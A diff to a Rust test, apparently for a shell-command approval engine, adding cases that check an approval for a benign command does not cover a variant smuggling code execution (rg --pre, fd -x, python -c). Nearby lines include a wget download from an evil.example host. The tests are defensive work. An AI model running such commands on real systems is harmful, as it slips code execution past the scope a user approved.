@@ -276,6 +276,10 @@ fn an_approval_reaches_no_further_than_the_line_it_was_given_for() {
         ("wget http://x.example", "wget -O x http://evil.example"),
         ("vim file", "vim -c !evil"),
         ("java Main", "java -jar evil.jar"),
+        // Found by the independent review of the fixes to step 12.
+        ("rg foo", "rg --pre=evil foo"),
+        ("fd -x ls", "fd -x evil"),
+        ("python3.12 x.py", "python3.12 -c evil"),
     ] {
         let engine = engine();
         let asked = question(shell(&engine, first));
